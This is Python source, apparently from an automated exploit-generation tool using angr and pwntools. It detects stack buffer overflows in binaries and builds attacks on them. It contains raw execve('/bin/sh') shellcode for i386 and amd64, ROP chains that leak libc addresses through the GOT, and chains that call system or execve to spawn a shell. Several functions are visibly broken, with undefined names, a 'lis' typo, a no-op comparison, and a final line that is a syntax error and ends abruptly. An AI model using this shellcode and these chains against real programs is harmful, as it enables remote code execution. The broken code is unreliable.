import claripy
from .radare_helper import findShellcode
from .remote_libc import get_remote_libc_with_leaks
import angr
from pwn import *
import logging

logging.getLogger("pwnlib.elf.elf").disabled = True


log = logging.getLogger(__name__)

is_printable = False

def check_symbolic_bits(state,val):
    bits = 0
    for idx in range(state.arch.bits):
        if val[idx].symbolic:
            bits += 1
    return bits
 
def print_pc_overflow_msg(state,byte_s):
    print("\n[========find a pc overflow========]")
    print("over for ",hex(byte_s),"bytes")
    print("[PC]stdout:\n",state.posix.dumps(1))
    print("[PC]trigger overflow input:")
    print(state.posix.dumps(0))

def print_bp_overflow_msg(state,byte_s):
    print("\n[========find a bp overflow========]")
    print("over for ",hex(byte_s),"bytes")
    print("[PC]stdout:\n",state.posix.dumps(1))
    print("[PC]trigger overflow input:")
    print(state.posix.dumps(0))
    # print(len(state.posix.dumps(0)))
def check_end(state, simgr):
	try:
		if state.addr==0:
			return

		insns=state.project.factory.block(state.addr).capstone.insns
		if len(insns)>=2:
			flag=0
			#check for : leave; ret;
			for ins in insns:
				if ins.insn.mnemonic=="leave":
					flag+=1
				if ins.insn.mnemonic=="ret":
					flag+=1

			# ins0=insns[0].insn
			# ins1=insns[1].insn
			# if ins0.mnemonic=="leave" and ins1.mnemonic=="ret":
			if flag==2:
				rsp=state.regs.rsp
				rbp=state.regs.rbp
				byte_s=state.arch.bytes
				stack_rbp=state.memory.load(rbp,8,endness=angr.archinfo.Endness.LE)
				stack_ret=state.memory.load(rbp+byte_s,8,endness=angr.archinfo.Endness.LE)
				pre_target=state.callstack.ret_addr
				# print(state.globals['rbp_list'])
				pre_rbp=state.globals['rbp_list'][hex(pre_target)]

				if stack_ret.symbolic:
					num=check_symbolic_bits(state,stack_ret)
					print_pc_overflow_msg(state,num//byte_s)
					state.globals["type"] = "Overflow_pc"
					state.globals["input"] = state.posix.dumps(0)
					state.memory.store(rbp,pre_rbp,endness=angr.archinfo.Endness.LE)
					state.memory.store(rbp+byte_s, state.solver.BVV(pre_target, 64),endness=angr.archinfo.Endness.LE)
					simgr.stashes["found"].append(state)
					simgr.stashes["active"].remove(state)
					return simgr



				if stack_rbp.symbolic:
					num=check_symbolic_bits(state,stack_rbp)
					print_bp_overflow_msg(state,num//byte_s)
					state.globals["type"] = "Overflow_bp"
					state.globals["input"] = state.posix.dumps(0)
					state.memory.store(rbp,pre_rbp,endness=angr.archinfo.Endness.LE)
					simgr.stashes["found"].append(state)
					simgr.stashes["active"].remove(state)
					return simgr
	except:
		return

def check_head(state, simgr):
   
    # if ((state.addr / 0x400000) >=1) :
    try:
        insns=state.project.factory.block(state.addr).capstone.insns
        
        # print(len(insns))
        if len(insns) >=3:
            #check for : endbr64, push rbp; mov rsp,rbp;
            ins0 = insns[0].insn
            ins1=insns[1].insn
            ins2=insns[2].insn
            if len(ins1.operands)==1 and len(ins2.operands)==2 and len(ins0.operands) == 0:
                # print(insns)
                ins0_name = ins0.mnemonic #endbr64
                ins1_name=ins1.mnemonic#push 
                ins1_op0=ins1.reg_name(ins1.operands[0].reg)#rbp
                ins2_name=ins2.mnemonic#mov 
                ins2_op0=ins2.reg_name(ins2.operands[0].reg)#rsp
                ins2_op1=ins2.reg_name(ins2.operands[1].reg)#rbp

                if ins0_name == "endbr64" and ins1_name=="push" and ins1_op0=="rbp" and ins2_name=="mov" and ins2_op0=="rbp" and ins2_op1=="rsp":
                    # print("find a function head,save the rsp,rbp")
                    pre_target=state.callstack.ret_addr
                    state.globals['rbp_list'][hex(pre_target)]=state.regs.rbp
        elif len(insns) >=2:
            #check for : push rbp; mov rsp,rbp; 
            ins0=insns[0].insn
            ins1=insns[1].insn
            if len(ins0.operands)==1 and len(ins1.operands)==2:
                # print(insns)
                ins0_name=ins0.mnemonic#push 
                ins0_op0=ins0.reg_name(ins0.operands[0].reg)#rbp
                ins1_name=ins1.mnemonic#mov 
                ins1_op0=ins1.reg_name(ins1.operands[0].reg)#rsp
                ins1_op1=ins1.reg_name(ins1.operands[1].reg)#rbp

                if ins0_name=="push" and ins0_op0=="rbp" and ins1_name=="mov" and ins1_op0=="rbp" and ins1_op1=="rsp":
                    # print("find a function head,save the rsp,rbp")
                    pre_target=state.callstack.ret_addr
                    state.globals['rbp_list'][hex(pre_target)]=state.regs.rbp
    except:
        return

def overflow_detect_filter(simgr):
	while simgr.active:
		for state in simgr.active:
			if state.globals.get("type", None) == "overflow_variable":
				log.info("Found vulnerable state. Overflow variable to win")
				user_input = state.globals["user_input"]
				input_bytes = state.solver.eval(user_input, cast_to=bytes)
				log.info("[+] Vulnerable path found {}".format(input_bytes))
				state.globals["type"] = "overflow_variable"
				state.globals["input"] = input_bytes
				simgr.stashes["found"].append(state)
				simgr.stashes["active"].remove(state)
				return simgr
			check_head(state, simgr)
			check_end(state, simgr)
		simgr.step()

	# for state in simgr.unconstrained:
	# 	bits = state.arch.bits
	# 	num_count = bits / 8
	# 	# print(num_count)
	# 	pc_value = b"C" * int(num_count)

	# # Check satisfiability
	# 	if state.solver.satisfiable(extra_constraints=[state.regs.pc == pc_value]):

	# 		state.add_constraints(state.regs.pc == pc_value)
	# 		user_input = state.globals["user_input"]
 
	# 		log.info("Found vulnerable state.")

	# 		if is_printable:
	# 			log.info("Constraining input to be printable")
	# 			for c in user_input.chop(8):
	# 				constraint = claripy.And(c > 0x2F, c < 0x7F)
	# 				if state.solver.satisfiable([constraint]):
	# 					state.add_constraints(constraint)

	# 		# Get input values
	# 		input_bytes = state.solver.eval(user_input, cast_to=bytes)
	# 		log.info("[+] Vulnerable path found {}".format(input_bytes))
	# 		if b"CCCC" in input_bytes:
	# 			log.info("[+] Offset to bytes : {}".format(input_bytes.index(b"CCCC")))
	# 		state.globals["type"] = "Overflow"
	# 		state.globals["input"] = input_bytes
	# 		simgr.stashes["found"].append(state)
	# 		simgr.stashes["unconstrained"].remove(state)
	# 		break

	# return simgr
class hook_win(angr.SimProcedure):
    IS_FUNCTION = True

    good_strings = [b"/bin/sh", b"/bin/bash", b"/bin/dash"]

    def run(self):

        if self.state.arch.bits == 64:
            cmd_ptr = self.state.regs.rdi
        if self.state.arch.bits == 32:
            # First arg pushed to the stack
            cmd_ptr = self.state.memory.load(self.state.regs.sp - 4, 4)
        cmd_str = self.state.memory.load(cmd_ptr, 32)

        arg = self.state.solver.eval(cmd_str, cast_to=bytes)

        log.info("system() called with {}".format(arg))
        if any(x in arg for x in self.good_strings):
            # Win!
            self.state.globals["type"] = "overflow_variable"


class hook_four(angr.SimProcedure):
    IS_FUNCTION = True

    def run(self):
        return 4  # Fair dice roll
def get_trimmed_input(user_input, state):
	trim_index = -1
	index = 0
	for c in user_input.chop(8):
		num_constraints = get_num_constraints(c, state)
		if num_constraints == 0 and trim_index == -1:
			trim_index = index
		else:
			trim_index == -1
		index += 1
	input_bytes = state.solver.eval(user_input, cast_to=bytes)

	if trim_index > 0:
		log.debug("Found input without constraints starting at {}".format(trim_index))
		return input_bytes[:trim_index]
	return input_bytes

def constrainToAddress(state, sym_val, addr, endian="little"):
	bits = state.arch.bits
	padded_addr = 0

	if bits ==32:
		padded_addr = p32(addr, endian=endian)
	elif bits == 64:
		botAddr = addr & 0xFFFFFFFF
		topAddr = (addr >> 32) & 0xFFFFFFFF
		padded_addr = p32(topAddr, endian=endian) + p32(botAddr, endian=endian)
	constraints = []
	for i in range(bits / 8):
		curr_byte = sym_val.get_byte(i)
		constraint = claripy.And(curr_byte == padded_addr[i])
		if state.se.satisfiable(extra_constraints=[constraint]):
			constraints.append(constraint)
	return constraints

def getShellFunctions(properties):
	context.arch = properties["protections"]["arch"]
	context.bits = p32
	if context.arch == "i386":  # /bin/sh shellcode - 23 bytes
		shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
	elif context.arch == "amd64":  # /bin/sh shellcode - 23 bytes
		context.bits = 64
		shellcode = (b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05")
	else:
		assembly = shellcraft.sh()  # This works, but the shellcode is usually long
		shellcode = asm(assembly)
	return shellcode

def get_leak_rop_chain(properties, leak_num=-1):
	context.binary = properties["file"]
	elf = ELF(properties["file"])
	rop = ROP(elf)

	print_functions = ["puts", "printf"]
	leak_function = lis(elf.got)[leak_num]
	log.debug("elf.got: {}".format(elf.got))
	log.debug("Leaking {}".format(leak_function))

	ret_func = None

	for function in print_functions:
		log.debug(function)
		log.debug(elf.plt)
		if function in elf.plt:
			ret_func = elf.plt[function]
			break
		elif function in elf.symbols:
			ret_func = elf.symbols[function]
			break
	if ret_func is None:
		raise RuntimeError("Cannot find symbol to return to")
	if not properties["sp_is_16bit_aligned"]:
		log.info("sp is aligned 16bit")
		rop.raw(rop.ret.address)
	rop.call(ret_func, [elf.got[leak_function]])
	retrigger_addr = properties.get("vulnerable_function", None)

	if retrigger_addr:
		rop.call(retrigger_addr.rebased_addr)
	elif "main" in elf.symbols:
		rop.call(elf.symbols["main"])
	else:
		log.error("No main symbol exposed, can't auto call")
	log.info("\n{}".format(rop.dump()))
	return rop, rop.build()

def choose_data_addr(elf, symbol):
	elf_load_address_fixup = elf.address - elf.load_addr
	symtab = elf.dynamic_value_by_tag("DT_SYMTAB") + elf_load_address_fixup
	versym = elf.dynamic_value_by_tag("DT_VERSYM") + elf_load_address_fixup
	bss = elf.get_section_by_name(".bss").header.sh_addr + elf_load_address_fixup
	start_search_addr = bss + len(symbol + b"\x00")

	end_search_addr = (bss + 0x1000) & ~0xFFF
	recommend_addr = start_search_addr
	for a in range(start_search_addr, end_search_addr, 2):
		index = align(0x10, a - symtab) //0x10
		version_addr = versym + (2*index)
		b = elf.read(version_addr, 2)
		val = int.from_bytes(b, "little")
		if val < 0x60:
			recommend_addr = a
			break
	return recommend_addr
def get_rop_chain(properties, state=None):
	context.binary = properties["file"]
	elf = ELF(properties["file"])
	rop = ROP(elf)

	string = [b"/bin/sh\x00", b"/bin/bash\x00"]
	function = ["execve", "system"]

	ret_func = None
	ret_string = None

	for function in functions:
		if function in elf.plt:
			ret_func = elf.plt[function]
			break
		elif function in elf.symbols:
			ret_func = elf.symbols[function]
			break
	if properties.get("libc", None):
		log.info("[~] Provided libc, using leak and lib to build chain")
		# if isinstance(properties["libc"], dict):
		# 	log.info("Trying remote libc offsets")
		# 	remote_libc = properties["libc"]["remote_libc"][0]
		libc = ELF(properties["libc"])
		libc.address = properties["libc_base_address"]
		for function in functions:
			if function in libc.plt:
				ret_func = libc.plt[function]
				break
			elif function in libc.symbols:
				ret_func = libc.symbols[function]
				break
		for string in strings:
			str_occurences = list(libc.search(string))
			if str_occurences:
				ret_string = str_occurences[0]
				break
		rop = ROP(libc)
	if properties["sp_is_16bit_aligned"]:
		log.info("sp is aligned 16bit")
		rop.raw(rop.ret.address)
	if properties.get("libc", None):
		rop.call(ret_func, [ret_string])
	else:
		rop.call(ret_func,[ret_string])
	log.info("\n{}".format(rop.dump()))
	return None, rop, rop.build()

def find_symbolic_buffer(state, length, arg = None):
	user_input = state.globals["user_input"]
	sym_addrs = []
	sym_addrs.extend(state.memory.addrs_for_name(next(iter(user_input.variables))))
	for addr in sym_addrs:
		if check_continuity(addr, sym_addrs, length):
			yield addr
def check_continuity(address, addresses, length):
	for i in range(length):
		if not address + i in addresses:
			return False
	return True

def point_to_win_filter(simgr):
	for state in simgr.unconstrained:
		properties = state.globals["properties"]
		for func in properties["win_functions"]:
			address = properties["win_functions"][func]["fcn_addr"]
			log.info("Trying {}".format(hex(address)))
			if state.solver.satisfiable(extra_constraints=[state.regs.pc = address])